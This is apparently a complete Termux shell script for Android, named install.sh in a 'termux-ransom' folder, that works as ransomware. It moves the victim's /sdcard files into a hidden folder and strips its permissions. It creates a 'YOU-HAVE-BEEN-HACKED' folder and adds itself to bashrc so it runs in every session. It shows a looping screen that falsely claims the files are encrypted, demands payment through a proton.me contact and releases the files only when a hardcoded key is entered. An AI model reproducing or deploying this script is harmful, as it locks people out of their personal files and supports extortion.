pkg install termimage
termux-setup-storage
mkdir /$HOME/.rfkzk
mv /sdcard/* /data/data/com.termux/files/home/.rfkzk
$chmod u=w /$HOME/.rfkzk
mkdir /sdcard/YOU-HAVE-BEEN-HACKED-😂
chmod u=x *
chmod u=rwx IMG-20240228-WA0000.jpg
chmod u=rx install.sh
clear
echo "alias IMAGE='cd /data/data/com.termux/files/home/termux-ransom ; bash install.sh'" >> /data/data/com.termux/files/usr/etc/bash.bashrc
echo "IMAGE" >> /data/data/com.termux/files/usr/etc/bash.bashrc
sed -i '9s/echo/#/' install.sh ; sed -i '10s/echo/#/' install.sh ; sed -i '11s/echo/#/' install.sh ; sed -i '12s/echo/#/' install.sh ; sed -i '2s/termux-setup-storage/#' install.sh
sleep 1
while :
do
	clear
	termimage IMG-20240228-WA0000.jpg
 	echo -e "\033[7;49;91m YOUR FILES ARE ENCRYPTED PLEASE ENTER THE KEY-WORD BELLOW!\033[m"
  	echo ""
   	echo -e "\033[0;49;95m Talk with the\033[m\033[0;49;93m userpropez8183718@proton.me\033[0;49;95m To get the Encrypt Key!\033[m"
    	echo ""
	echo -e "\033[4;49;92m"
	read -p "Encrypted Key: " key      
	echo -e "\033[m"
	if [ "$key" == "HoigIgDyufydUd3a%e7t*g9h9hs2g9sgi29hs1oh1ss1s19h" ]
	then
		echo -e "\033[0;49;92m THANK YOU FOR YOUR PAYMENT!\033[m"
		echo -e "\033[0;49;95m Please Check Your Gallery!"
		chmod u=rwx /$HOME/.rfkzk
		mv /$HOME/.rfkzk/* /sdcard
		sed -i 's/alias/#/' /data/data/com.termux/files/usr/etc/bash.bashrc
		break
	else
		echo -e "Please try again :("
		sleep 1
	fi



done
